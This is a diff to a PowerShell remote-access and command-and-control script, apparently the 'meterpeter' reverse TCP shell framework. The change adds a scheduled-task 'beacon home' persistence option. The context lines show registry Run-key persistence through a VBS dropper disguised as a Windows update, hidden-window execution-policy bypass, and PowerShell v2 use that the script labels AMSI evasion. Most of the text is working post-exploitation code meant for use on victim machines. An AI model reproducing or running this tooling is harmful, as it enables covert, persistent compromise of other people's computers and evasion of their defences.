@@ -6,7 +6,7 @@
    ReverseTCPShell - Framework. This PS1 starts a listener Server on a Windows attacker machine and generate oneline revshell
    payloads for CMD and PS to be executed on the victim machine. You can use the generated oneline revshell payload also via
    netcat on linux. (in this case you will lose the C2 functionalities like screenshot, upload and download files). If this
-   framework is executed using venom v1.0.16 framework {amsi evasion nº4} then linux users will not lost C2 functionalities
+   framework is executed using venom v1.0.16 framework {amsi evasion nÂº4} then linux users will not lost C2 functionalities
    and the target connection terminal window will be executed hidden with the help of dropper.bat script.
 
 .EXECUTION:
@@ -181,7 +181,7 @@ $Modules = @"
 Clear-Host;
 Write-Host $Modules;
 ## Venom v1.0.16 function
-# Auto-Venom-Settings {Agent nº 5}
+# Auto-Venom-Settings {Agent nÂº 5}
 $DISTRO_OS = pwd|Select-String -Pattern "/" -SimpleMatch; # <-- (check IF windows|Linux Separator)
 If($DISTRO_OS)
 {
@@ -482,15 +482,18 @@ While($Client.Connected)
         }
         If($my_choise -eq "Create" -or $my_choise -eq "Create")
         {
-          write-Host " - Input TaskName: " -NoNewline;
+          write-Host " - Input TaskName to create: " -NoNewline;
           $TaskName = Read-Host;
-          write-Host " - Input Interval (minuts): " -NoNewline;
+          write-Host " - Input Interval (in minuts): " -NoNewline;
           $Interval = Read-Host;
+          write-Host " - Task Duration (from 1 TO 9 Hours): " -NoNewline;
+          $userinput = Read-Host;
+          $Display_dur = "$userinput"+"Hours";$Task_duration = "000"+"$userinput"+":00";
           write-host " Examples: 'cmd /c start calc.exe' [OR] '`$env:tmp\dropper.bat'" -ForegroundColor Blue -BackGroundColor White;
           write-Host " - Input Command|Binary Path: " -NoNewline;
           $execapi = Read-Host;
-          write-host " Create Task to execute with: $Interval minuts of interval." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$TaskName`" /tr `"$execapi`";schtasks /Query /tn `"$TaskName`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force";
+          write-host "[*] This task wil have the max duration of $Display_dur" -ForegroundColor green;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$TaskName`" /tr `"$execapi`" /du $Task_duration;schtasks /Query /tn `"$TaskName`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force";
         }
         If($my_choise -eq "Delete" -or $my_choise -eq "Delete")
         {
@@ -745,6 +748,7 @@ While($Client.Connected)
         write-host "   StartUp   Persiste Client Using startup   Client:User  - Privileges required";
         write-host "   RUNONCE   Persiste Client using REG:Run   Client:User  - Privileges required";
         write-host "   REGRUN    Persiste Client using REG:Run   Client:User|Admin - Privs required";
+        write-host "   Schtasks  Persiste Client using Schtasks  Client:User|Admin - Privs required";
         write-host "   WinLogon  Persiste Client using WinLogon  Client:Admin - Privileges required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Persistance> " -NoNewline -ForeGroundColor Green;
@@ -778,6 +782,21 @@ While($Client.Connected)
           Write-Host "   Update-KB4524147.ps1   $env:tmp\KBPersist.vbs`n";
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}else{cmd /R reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}}else{cmd /R reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs}";
           }
+        If($startup_choise -eq "Schtasks" -or $startup_choise -eq "tasks")
+        {
+          $onjuyhg = ([char[]]([char]'A'..[char]'Z') + 0..9 | sort {get-random})[0..7] -join '';
+          write-host " Make Client Beacon Home Every xx Minuts." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;
+          write-Host " - Input Client Remote Path: " -NoNewline;
+          $execapi = Read-Host;
+          write-Host " - Input Beacon Interval (minuts): " -NoNewline;
+          $Interval = Read-Host;write-host "`n";
+          Write-Host "   TaskName   Client Remote Path" -ForeGroundColor green;
+          Write-Host "   --------   ------------------";
+          Write-Host "   $onjuyhg   $execapi";
+          write-host "`n";
+          ## Settings: ($stime == time-interval) | (/st 00:00 /du 0003:00 == 3 hours duration)
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -version 2 -Execution Bypass -windowstyle hidden -NoProfile -File $execapi`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File $execapi`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File $execapi`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}";
+        }
         If($startup_choise -eq "WinLogon" -or $startup_choise -eq "logon")
         {
           ## If Available use powershell -version 2 {AMSI Logging Evasion}
